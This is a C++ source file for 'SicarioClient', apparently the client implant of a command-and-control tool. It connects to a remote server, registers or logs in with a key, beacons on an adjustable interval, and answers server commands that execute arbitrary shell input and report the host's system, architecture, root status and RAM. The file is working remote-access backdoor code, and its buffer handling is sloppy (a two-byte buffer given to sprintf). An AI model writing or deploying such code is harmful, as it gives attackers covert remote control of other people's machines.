#include "sicarioClient.h"

SicarioClient::SicarioClient(std::string serverAddress, short port) {
    conn = socket(AF_INET, SOCK_STREAM, 0);
    memset(&connAddress, 0, sizeof(connAddress));
    connAddress.sin_family = AF_INET;
    connAddress.sin_port = htons(port);
    inet_pton(AF_INET,serverAddress.c_str(),&connAddress.sin_addr);
    connect(conn, (struct sockaddr*)&connAddress, sizeof(connAddress));

    connInterval=60;
}

SicarioClient::~SicarioClient() {
    close(conn);
}

void SicarioClient::disconnect() {
    close(conn);
}

void SicarioClient::reconnect() {
    conn = socket(AF_INET, SOCK_STREAM, 0);
    connect(conn, (struct sockaddr*)&connAddress, sizeof(connAddress));

}

void SicarioClient::sendPacket(std::string data) {
    send(conn,data.c_str(),data.length(),0);
}

std::string SicarioClient::receivePacket() {
    char buffer[2048] = {0};
    recv(conn,buffer,sizeof(buffer),0);
    return std::string(buffer);
}

void SicarioClient::sendData(std::string data) {
    if(data.length() <= 2042) {
        sendPacket("SC00(" + data + ")");
    } else {
        float temp=ceil(data.length() / 2042.f);
        short maxPackets=temp;
        for(short i=maxPackets; i > 0; i--) {
            char buffer[2];
            sprintf(buffer, "%02d", i);
            sendPacket("SC" + std::string(buffer) + "("
                    + data.substr((maxPackets-i) * 2042, 2042) + ")");
        }
	sendPacket("SC00(" + data.substr(maxPackets * 2042,data.length() % 2042) + ")");
    }
}

std::string SicarioClient::receiveData() {
    std::string data = receivePacket();
    if(data.substr(0,2) != "SC")
        throw 2;
    if(data.substr(0,4) == "SC00")
        return data.substr(5,data.length()-6);
    else {
        return data.substr(5,data.length()-6) + receiveData();
    }
}

std::string SicarioClient::registerUser(){
    sendData("register");
    std::string userKey = receiveData();
    userKey = userKey.substr(8,userKey.length());
    this->userKey = userKey;
    return userKey;
}

void SicarioClient::loginUser(std::string userKey) {
    sendData("login " + userKey);
    this->userKey = userKey;
}

// WARNING: Only non-header commands!
std::string SicarioClient::interpretCommand(std::string command) {
    if(command.substr(0,7) == "execute") {
        return executeCommand(command.substr(7,command.length()-7));
    } else if(command.substr(0,10) == "get system") {
        return getSystem();
    } else if(command.substr(0,16) == "get architecture") {
        return getArchitecture();
    } else if(command.substr(0,12) == "get interval") {
        return std::to_string(this->connInterval);
    } else if(command.substr(0,12) == "set interval") {
        this->connInterval=atoi(command.substr(12,command.length()-13).c_str());
        return "";
    } else if(command.substr(0,11) == "get is_root") {
        return isRoot() ? "1" : "0";
    } else if(command.substr(0,7) == "get ram") {
        return std::to_string(getRAM());
    } else if(command == "") {
        return "";
    } else {
        throw 1;
    }
}

